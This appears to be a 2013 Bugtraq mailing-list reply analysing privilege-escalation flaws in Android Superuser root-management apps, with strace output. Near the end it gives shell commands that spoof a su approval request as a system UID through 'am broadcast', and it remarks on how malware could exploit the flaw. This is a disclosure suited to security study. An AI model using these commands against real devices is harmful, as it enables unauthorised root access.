@@ -1,0 +1,118 @@
+
+Date: Thu, 14 Nov 2013 12:19:22 -0800
+From: Kevin Cernekee <cernekee@...il.com>
+To: "Gleb O. Raiko" <raiko@...si.msk.ru>
+Cc: bugtraq@...urityfocus.com
+Subject: Re: Superuser unsanitized environment vulnerability on Android <= 4.2.x
+
+On Thu, Nov 14, 2013 at 7:44 AM, Gleb O. Raiko <raiko@...si.msk.ru> wrote:
+> Considering ChainsDD Superuser you mentioned.
+> Unfortunately, your mail describes just potential attack vectors. While I
+> can't say for sure, Superuser isn't vulnerable at all, I'd like to note that
+> su invokes the am script in the process with the credentials of the caller,
+> not root. Thus, by manipulating the environment variables, file descriptors,
+> signals, etc, the user can get yet another process with the same
+> credentials, perhaps, with a shell or with an instance of Davlik VM inside.
+
+Full disclosure: my testing so far has been mainly focused on SuperSU
+and CWM Superuser on JB 4.2/4.3, mostly due to (perceived?) Superuser
+market share and the fact that the respective developers responded to
+my initial problem report.
+
+I did not hear back from ChainsDD at all, and AFAICT the project is
+abandoned.  From what I've been able to piece together, it looks like
+CM/AOKP users (~11-14 million[1][2]) are using the builtin CWM
+Superuser, and most other active modders (~20 million) are using
+SuperSU.  Actual exploits were verified against these two projects.
+
+But you brought up an interesting question, so let's take a look.
+
+
+The easiest case to consider is JB 4.2: due to the new multiuser
+features, "am broadcast" requires a special system permission[3] and
+responds with this (not entirely accurate) message when run from e.g.
+UID 10003:
+
+    W/ActivityManager(  413): Permission Denial: broadcast asks to run
+as user -1 but is calling from user 0; this requires
+android.permission.INTERACT_ACROSS_USERS_FULL or
+android.permission.INTERACT_ACROSS_USERS
+
+This is why CWM Superuser and SuperSU both execute am as root.
+
+
+For the pre-JB-4.2 case, ChainsDD Superuser does drop privilege before
+running am.  Some random observations:
+
+ - su will block for a little while waiting to hear back from the Java
+app, making it easy for us to hijack the sequence at just the right
+time
+
+ - We have control over the parent's file descriptor for the socket
+which the app uses to convey the verdict:
+
+    27495 unlink("/dev/com.noshufou.android.su/.socket27495") = -1
+ENOENT (No such file or directory)
+    27495 bind(12, {sa_family=AF_UNIX,
+path="/dev/com.noshufou.android.su/.socket27495"}, 110) = 0
+    27495 listen(12, 1)                     = 0
+    [...]
+    27495 getgid32()                        = 10003
+    27495 setresgid32(0xffffffff, 0x2713, 0xffffffff) = 0
+    27495 getuid32()                        = 10003
+    27495 open("/acct/uid/10003/tasks", O_RDWR|O_CREAT, 0666) = -1
+EACCES (Permission denied)
+    27495 mkdir("/acct/uid/10003", 0775)    = -1 EEXIST (File exists)
+    27495 setresuid32(0xffffffff, 0x2713, 0xffffffff) = 0
+    27495 sigprocmask(SIG_BLOCK, [CHLD], []) = 0
+    27495 vfork()                           = 27496
+    [...]
+    27496 execve("/system/bin/sh", ["sh", "-c", "/system/bin/am
+broadcast -a 'com.noshufou.android.su.REQUEST' --es socket
+'/dev/com.noshufou.android.su/.socket27495' --ei caller_uid '10003'
+--ei allow '-1' --ei version_code '17' > /dev/null"], [/* 23 vars */])
+= 0
+
+ - Not sure if I have up-to-date source code for this binary, but I've
+seen at least one copy of activity.c that doesn't check the return
+values from setresuid(), possibly leaving it open to a
+rageagainstthecage-style attack[4]
+
+ - Perms on /dev/com.noshufou.android.su are 0750, with Superuser's uid/gid
+
+ - Superuser 3.2-RC3 has the android:debuggable flag set in the
+manifest, so the shell user might be able to use run-as to hijack its
+UID (3.1.3 doesn't)
+
+ - The socket has a highly predictable filename
+
+ - We have access to the intent's extra data from "su", and can
+manipulate it as desired
+
+ - The caller's UID is "usually" passed over the socket by trusted
+code, but if you specify a version_code <= 15, SuRequestActivity.java
+will trust the data provided on the command line.  This allows you to
+spoof a request from any installed app, or even the Android System
+
+So maybe try something like:
+
+    BOOTCLASSPATH= su -c id &
+    ps | grep su
+    # note the PID and substitute below
+    /system/bin/am broadcast -a 'com.noshufou.android.su.REQUEST' --es
+socket '/dev/com.noshufou.android.su/.socket27495' --ei caller_uid
+'1000' --ei allow '-1' --ei version_code '15'
+
+There is a bit of a social engineering component to this, so a malware
+app would probably want to recognize the UIDs of well-known root
+packages in order to maximize the odds that the user will approve the
+request.
+
+Can you think of a way to exploit ChainsDD Superuser without user
+interaction on pre-4.2 devices?
+
+
+[1] http://stats.cyanogenmod.com/
+[2] http://stats.aokp.co/
+[3] http://insitusec.blogspot.com/2013/02/interact-across-users-permission-side.html
+[4] http://dtors.org/2010/08/25/reversing-latest-exploid-release/
